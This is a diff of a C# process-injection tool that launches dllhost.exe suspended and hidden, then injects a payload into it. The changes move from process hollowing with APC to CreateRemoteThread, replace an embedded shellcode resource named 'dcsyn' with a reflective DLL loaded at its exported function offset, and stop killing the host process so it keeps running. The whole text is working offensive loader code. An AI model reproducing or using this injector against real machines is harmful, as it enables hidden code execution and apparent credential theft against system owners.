@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading;
@@ -23,12 +24,13 @@ namespace Inject
         {
             //APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.DInvoke;
             APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.PInvoke;
-            //APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.CreateRemoteThread;
-            APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.ProcessHollowingWithAPC;
+            APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.CreateRemoteThread;
+            //APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.ProcessHollowingWithAPC;
 
             string cmd = @"c:\windows\system32\dllhost.exe";
             //byte[] shellcode = Properties.Resources.Payload;
-            byte[] shellcode = Properties.Resources.dcsyn;
+            //byte[] shellcode = Properties.Resources.dcsyn;
+            byte[] reflectiveDll = File.ReadAllBytes("E:\\Share\\Projects\\C++\\CustomLoader\\x64\\Release\\RflDllAssemblyLoader.dll");
             ProcessCreationResult procResult = null;
 
             try
@@ -41,7 +43,10 @@ namespace Inject
                 var creationParms = new ProcessCreationParameters()
                 {
                     Command = cmd,
-                    RedirectOutput = true,
+                    //
+                    //
+                    //RedirectOutput = true,
+                    RedirectOutput = false,
                     CreateNoWindow = true,
                     CreateSuspended = true,
                 };
@@ -53,7 +58,9 @@ namespace Inject
                 Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
                 Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");
 
-                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);
+                //APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);
+                var offset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(reflectiveDll, "ReflectiveFunction");
+                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, reflectiveDll, offset);
 
                 if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
                 {
@@ -74,7 +81,7 @@ namespace Inject
                     APIWrapper.CloseHandle(procResult.ProcessHandle);
                     APIWrapper.CloseHandle(procResult.ThreadHandle);
                     APIWrapper.CloseHandle(procResult.OutPipeHandle);
-                    APIWrapper.KillProcess(procResult.ProcessId);
+                    //APIWrapper.KillProcess(procResult.ProcessId);
                 }
             }
         }
